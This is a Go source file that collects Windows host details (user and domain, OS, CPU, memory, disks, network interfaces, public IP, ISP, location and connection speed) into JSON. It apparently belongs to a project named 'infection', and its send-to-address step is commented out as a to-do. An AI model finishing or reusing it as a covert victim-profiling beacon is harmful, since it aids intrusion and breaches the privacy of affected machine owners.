package machineinfo

import (
	"encoding/json"
	"fmt"
	"gopkg.in/alecthomas/kingpin.v2"
	Server "infection/server"
	User "infection/user"
	//"io/ioutil"
	"net"
	//"net/http"
	//"net/url"
	"strings"
	"syscall"
	"time"
	"unsafe"
	//"github.com/shirou/gopsutil/cpu"
	"github.com/shirou/gopsutil/host"
	//"github.com/shirou/gopsutil/mem"
	"github.com/StackExchange/wmi"
)

var (
	advapi = syscall.NewLazyDLL("Advapi32.dll")
	kernel = syscall.NewLazyDLL("Kernel32.dll")
)

func setTimeout() {
	if *timeoutOpt != 0 {
		timeout = *timeoutOpt
	}
}

var (
	showList   = kingpin.Flag("list", "Show available speedtest.net servers").Short('l').Bool()
	serverIds  = kingpin.Flag("server", "Select server id to speedtest").Short('s').Ints()
	timeoutOpt = kingpin.Flag("timeout", "Define timeout seconds. Default: 10 sec").Short('t').Int()
	timeout    = 10
)

type machineInfo struct {
	StartUpTime   string      `json:"startup"`
	SystemUser    string      `json:"user"`
	SystemVersion []string    `json:"sysversion"`
	Cpu           string      `json:"cpu"`
	Mem           string      `json:"mem"`
	Disk          []diskusage `json:"disk"`
	NetCard       []intfInfo  `json:"net"`
	OIp           string      `json:"ip"`
	Isp           string      `json:"isp"`
	Lat           string      `json:"lat"`
	Lon           string      `json:"Lon"`
	Down          string      `json:"down"`
	Up            string      `json:"up"`
}

func MachineSend(addr string) {
	kingpin.Version("1.0.3")
	kingpin.Parse()
	setTimeout()
	user := User.FetchUserInfo()
	out := user.Show()
	list := Server.FetchServerList(user.Lat, user.Lon)
	if *showList {
		list.Show()
		return
	}
	targets := list.FindServer(*serverIds)
	targets.StartTest()
	spd := targets.ShowResult()
	MachineInfo := machineInfo{
		StartUpTime:   GetStartTime(),
		SystemUser:    GetUserName(),
		SystemVersion: GetSystemVersion(),
		Cpu:           GetCpuInfo(),
		Mem:           GetMemory(),
		Disk:          GetDiskInfo(),
		NetCard:       GetIntfs(),
		OIp:           out.OIp,
		Isp:           out.Isp,
		Lat:           out.Lat,
		Lon:           out.Lon,
		Down:          spd.Down,
		Up:            spd.Up,
	}
	b, _ := json.Marshal(MachineInfo)
	//resp, err := http.PostForm(addr, url.Values{"name": {"789"}, "ext": {"789"}, "auth": {"789"}})
	//if err != nil {
	//	fmt.Printf("请检查网络")
	//}
	//body,err := ioutil.ReadAll(resp.Body)
	//fmt.Println(string(body))
	//todo send
	fmt.Println(string(b))
}
func GetStartTime() string {
	GetTickCount := kernel.NewProc("GetTickCount")
	r, _, _ := GetTickCount.Call()
	if r == 0 {
		return ""
	}
	ms := time.Duration(r * 1000 * 1000)
	return ms.String()
}

//get current user
func GetUserName() string {
	var size uint32 = 128
	var buffer = make([]uint16, size)
	user := syscall.StringToUTF16Ptr("USERNAME")
	domain := syscall.StringToUTF16Ptr("USERDOMAIN")
	r, err := syscall.GetEnvironmentVariable(user, &buffer[0], size)
	if err != nil {
		return ""
	}
	buffer[r] = '@'
	old := r + 1
	if old >= size {
		return syscall.UTF16ToString(buffer[:r])
	}
	r, err = syscall.GetEnvironmentVariable(domain, &buffer[old], size-old)
	return syscall.UTF16ToString(buffer[:old+r])
}

type Machine struct {
	Host host.InfoStat `json:"host"`
}

//sysversion
func GetSystemVersion() []string {
	hostInfo, hostErr := host.Info()
	if hostErr != nil {
		fmt.Println("error", hostErr)
	}
	var machine = Machine{Host: *hostInfo}
	hostbuf := make([]string, 0, 1)
	hostbuf = append(hostbuf, machine.Host.String())
	return hostbuf
}

type diskusage struct {
	Path  string `json:"path"`
	Total uint64 `json:"total"`
	Free  uint64 `json:"free"`
}

func usage(getDiskFreeSpaceExW *syscall.LazyProc, path string) (diskusage, error) {
	lpFreeBytesAvailable := int64(0)
	var info = diskusage{Path: path}
	diskret, _, err := getDiskFreeSpaceExW.Call(
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(info.Path))),
		uintptr(unsafe.Pointer(&lpFreeBytesAvailable)),
		uintptr(unsafe.Pointer(&(info.Total))),
		uintptr(unsafe.Pointer(&(info.Free))))
	if diskret != 0 {
		err = nil
	}
	return info, err
}

//disk parttion part
func GetDiskInfo() (infos []diskusage) {
	GetLogicalDriveStringsW := kernel.NewProc("GetLogicalDriveStringsW")
	GetDiskFreeSpaceExW := kernel.NewProc("GetDiskFreeSpaceExW")
	lpBuffer := make([]byte, 254)
	diskret, _, _ := GetLogicalDriveStringsW.Call(
		uintptr(len(lpBuffer)),
		uintptr(unsafe.Pointer(&lpBuffer[0])))
	if diskret == 0 {
		return
	}
	for _, v := range lpBuffer {
		if v >= 65 && v <= 90 {
			path := string(v) + ":"
			if path == "A:" || path == "B:" {
				continue
			}
			info, err := usage(GetDiskFreeSpaceExW, string(v)+":")
			if err != nil {
				continue
			}
			infos = append(infos, info)
		}
	}
	return infos
}

//cpu
//fmt.Sprintf("Num:%d Arch:%s\n", runtime.NumCPU(), runtime.GOARCH)
func GetCpuInfo() string {
	var size uint32 = 128
	var buffer = make([]uint16, size)
	var index = uint32(copy(buffer, syscall.StringToUTF16("Num:")) - 1)
	nums := syscall.StringToUTF16Ptr("NUMBER_OF_PROCESSORS")
	arch := syscall.StringToUTF16Ptr("PROCESSOR_ARCHITECTURE")
	r, err := syscall.GetEnvironmentVariable(nums, &buffer[index], size-index)
	if err != nil {
		return ""
	}
	index += r
	index += uint32(copy(buffer[index:], syscall.StringToUTF16(" Arch:")) - 1)
	r, err = syscall.GetEnvironmentVariable(arch, &buffer[index], size-index)
	if err != nil {
		return syscall.UTF16ToString(buffer[:index])
	}
	index += r
	return syscall.UTF16ToString(buffer[:index+r])
}

type memoryStatusEx struct {
	cbSize                  uint32
	dwMemoryLoad            uint32
	ullTotalPhys            uint64 // in bytes
	ullAvailPhys            uint64
	ullTotalPageFile        uint64
	ullAvailPageFile        uint64
	ullTotalVirtual         uint64
	ullAvailVirtual         uint64
	ullAvailExtendedVirtual uint64
}

//内存信息
func GetMemory() string {
	GlobalMemoryStatusEx := kernel.NewProc("GlobalMemoryStatusEx")
	var memInfo memoryStatusEx
	memInfo.cbSize = uint32(unsafe.Sizeof(memInfo))
	mem, _, _ := GlobalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&memInfo)))
	if mem == 0 {
		return ""
	}
	return fmt.Sprint(memInfo.ullTotalPhys / (1024 * 1024))
}

type intfInfo struct {
	Name string
	Ipv4 []string
	Ipv6 []string
}

//net card
func GetIntfs() []intfInfo {
	intf, err := net.Interfaces()
	if err != nil {
		return []intfInfo{}
	}
	var is = make([]intfInfo, len(intf))
	for i, v := range intf {
		ips, err := v.Addrs()
		if err != nil {
			continue
		}
		is[i].Name = v.Name
		for _, ip := range ips {
			if strings.Contains(ip.String(), ":") {
				is[i].Ipv6 = append(is[i].Ipv6, ip.String())
			} else {
				is[i].Ipv4 = append(is[i].Ipv4, ip.String())
			}
		}
	}
	return is
}

//mainboard
func GetMotherboardInfo() string {
	var s = []struct {
		Product string
	}{}
	err := wmi.Query("SELECT  Product  FROM Win32_BaseBoard WHERE (Product IS NOT NULL)", &s)
	if err != nil {
		return ""
	}
	return s[0].Product
}

//BIOS
func GetBiosInfo() string {
	var s = []struct {
		Name string
	}{}
	err := wmi.Query("SELECT Name FROM Win32_BIOS WHERE (Name IS NOT NULL)", &s) // WHERE (BIOSVersion IS NOT NULL)
	if err != nil {
		return ""
	}
	return s[0].Name
}
